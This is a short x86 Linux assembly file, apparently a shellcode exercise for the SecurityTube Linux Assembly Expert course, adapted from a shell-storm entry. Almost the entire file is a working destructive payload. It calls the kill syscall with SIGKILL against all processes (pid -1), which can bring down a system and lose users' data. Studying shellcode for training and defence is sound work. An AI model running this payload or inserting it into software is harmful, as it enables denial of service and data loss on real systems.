; source http://shell-storm.org/shellcode/files/shellcode-212.php
; Modified by Author SLAE - 926 for SecurityTube Linux Assembly Expert course

global _start
_start:

xor ebx, ebx
dec ebx ; set ebx to -1 to target all processes
push byte 9
pop ecx ; SIGKILL
push byte 37
pop eax ; kill syscall
int 0x80 ; kill all processes
